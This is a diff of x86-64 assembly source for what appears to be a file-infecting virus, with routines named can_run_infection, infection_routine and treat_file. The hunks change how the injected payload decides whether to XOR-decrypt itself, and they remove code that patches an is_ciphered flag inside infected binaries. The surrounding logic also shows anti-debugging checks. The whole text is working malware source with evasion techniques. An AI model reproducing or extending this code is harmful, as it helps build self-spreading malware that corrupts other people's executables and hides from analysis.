@@ -88,16 +88,15 @@ can_run_infection:
 	jl .debugged					; 	goto .debugged;
 
 	; TODO: merge this uncipher with anti-debugger instructions
-	.uncipher_flag_instr:
-		db 0xbf, 00, 00, 00, 00				; mov rdi, 0x0 => is_ciphered = 0 (this value will be modified when injected in a binary)
-		cmp rdi, 0x0					; if (is_ciphered == 0x0)
-		je .valid					; 	goto .valid;
-		lea rdi, [rel begin]				; data = begin addr
-		add rdi, infection_routine - begin		; data += infection_routine - begin
-		mov rsi, _end - infection_routine		; size = _end - infection_routine
-		lea rdx, [rel key]				; key = key
-		call xor_cipher					; xor_cipher(data, size, key)
-		; TODO: check file is really unciphered
+	mov rax, [rel compressed_data_size2]		; if (compressed_data_size2 == 0)
+	cmp rax, 0x0					; ...
+	je .valid					; 	goto .valid;
+	lea rdi, [rel begin]				; data = begin addr
+	add rdi, infection_routine - begin		; data += infection_routine - begin
+	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	lea rdx, [rel key]				; key = key
+	call xor_cipher					; xor_cipher(data, size, key)
+	; TODO: check file is really unciphered
 
 	.valid:
 		mov rax, 1					; return 1;
@@ -630,14 +629,6 @@ treat_file:
 	mov rsi, _end - infection_routine		; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
-
-	; change is_ciphered flag in injected code
-	mov rdi, [mappedfile]				; is_ciphered_ptr = file_map + filesize + (can_run_infection.uncipher_flag_instr - begin);
-	add rdi, [filesize]				;
-	add rdi, can_run_infection.uncipher_flag_instr - begin
-	inc rdi						; 	+ 1;
-	mov eax, 0x1					; flag = 1;
-	mov [rdi], eax					; *is_ciphered_ptr = flag;
 
 
 .unmap_file:
